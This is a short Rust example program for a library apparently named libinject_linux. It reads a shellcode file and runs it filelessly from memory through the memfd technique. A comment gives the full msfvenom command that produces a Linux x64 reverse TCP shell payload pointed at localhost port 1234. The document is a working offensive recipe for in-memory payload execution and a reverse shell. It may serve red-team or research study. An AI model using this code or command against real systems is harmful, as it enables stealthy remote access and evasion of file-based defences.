use std::env::current_dir;

use libinject_linux::{memfd, Payload, PayloadType};

fn main() {
    let path = current_dir().unwrap();
    let cwd = path.display();

    // Shellcode:
    // msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
    let shellcode = format!("{}/examples/shellcode.bin", cwd);

    let payload = Payload::from_file(&shellcode, PayloadType::Shellcode);

    match memfd(payload) {
        Ok(res) => res,
        Err(error) => panic!("An error occured: {error:?}"),
    };
}
